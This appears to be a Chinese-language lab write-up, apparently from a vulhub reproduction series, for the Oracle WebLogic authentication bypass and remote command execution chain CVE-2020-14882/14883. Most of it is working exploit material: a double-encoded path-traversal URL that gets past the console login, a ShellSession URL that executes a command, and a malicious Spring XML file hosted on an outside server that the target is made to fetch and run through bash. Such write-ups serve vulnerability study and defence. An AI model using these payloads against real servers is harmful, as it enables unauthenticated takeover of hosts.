# Weblogic取消身份验证远程命令执行（CVE-2020-14882，CVE-2020-14883）

###### by ADummy

### 0x00利用路线

​			url直接命令执行/构造xml文件让weblogic服务器访问。

### 0x01漏洞介绍			

​			Oracle WebLogic Server是行业领先的应用程序服务器，用于使用Java EE标准构建企业应用程序，并在可靠的，可扩展的运行时上以较低的拥有成本进行部署。

在[2020年10月的Oracle重要补丁更新咨询中](https://www.oracle.com/security-alerts/cpuoct2020traditional.html)，Oracle修复了由Chaitin Tech的安全研究人员@Voidfyoo提交的两个安全漏洞，即CVE-2020-14882和CVE-2020-14883。

CVE-2020-14882允许远程用户绕过管理员控制台组件中的身份验证，而CVE-2020-14883允许经过身份验证的用户在管理员控制台组件上执行任何命令。使用这两个漏洞的链，未经身份验证的远程攻击者可以通过HTTP在Oracle WebLogic Server上执行任意命令，并完全控制主机。

##### 影响版本

```
10.3.6.0
12.1.3.0.0
12.2.1.1.0
```

### 0x02漏洞复现

访问`http://your-ip:7001/console`以查看管理员控制台登录页面。

![Weblogic_取消身份验证远程命令执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_取消身份验证远程命令执行_1.jpg)



使用此URL绕过控制台组件的身份验证：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
```

![Weblogic_取消身份验证远程命令执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_取消身份验证远程命令执行_2.jpg)



第二个漏洞CVE-2020-14883，有两种利用方法，一种是通过`com.tangosol.coherence.mvel2.sh.ShellSession`，另一种是通过`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`。

访问以下URL链接2个漏洞，并从中执行命令`com.tangosol.coherence.mvel2.sh.ShellSession`：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

`touch /tmp/success1` 已在容器内成功执行：

![Weblogic_取消身份验证远程命令执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_取消身份验证远程命令执行_3.jpg)







第二种利用方式

`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 是更常见的利用，它最初在CVE-2019-2725中引入，并且可用于任何Weblogic版本。

要利用`FileSystemXmlApplicationContext`，您需要制作一个精心制作的XML文件，并将其放在Weblogic可以访问的服务器上，例如`http://example.com/rce.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

然后，通过以下URL，Weblogic将加载此XML并在其中执行命令：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```